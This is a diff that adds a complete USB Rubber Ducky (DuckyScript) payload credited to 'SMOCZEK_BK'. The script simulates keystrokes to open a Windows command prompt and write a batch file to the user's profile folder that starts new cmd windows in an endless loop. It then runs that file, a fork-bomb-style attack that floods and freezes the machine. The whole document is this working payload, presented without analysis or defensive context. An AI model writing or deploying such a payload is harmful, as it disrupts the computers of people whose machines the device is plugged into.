@@ -1,0 +1,28 @@
+REM /----------------------------------\
+REM|        CODE BY SMOCZEK_BK          |
+REM \----------------------------------/      
+
+DELAY 1000
+
+GUI r
+DELAY 500
+
+STRING cmd
+DELAY 500
+
+ENTER
+DELAY 1000
+
+STRING echo @echo off > %userprofile%\cmd.bat && echo :loop >> %userprofile%\cmd.bat && echo start cmd >> %userprofile%\cmd.bat && echo goto loop >> %userprofile%\cmd.bat
+
+ENTER
+DELAY 2000
+
+ALT F4
+DELAY 500
+
+GUI r
+DELAY 500
+STRING %userprofile%\cmd.bat
+DELAY 500
+ENTER
